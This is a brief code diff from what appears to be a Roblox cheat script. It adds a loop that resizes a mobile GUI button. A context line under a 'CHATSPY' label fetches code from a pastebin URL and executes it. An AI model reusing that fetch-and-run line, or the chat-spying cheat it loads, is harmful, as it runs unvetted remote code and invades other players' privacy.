@@ -29,6 +29,10 @@ local prediction = 0.311505
 
 -- CHATSPY
 loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))()
+RS.RenderStepped:Connect(function()
+    local rlBtn = game:GetService("Players").LocalPlayer.PlayerGui.gui["mobile ppl"].rl
+    rlBtn.Size = UDim2.new(0, 60, 0, 60)
+end)
 
 local function getFullUser(input)
     user = nil
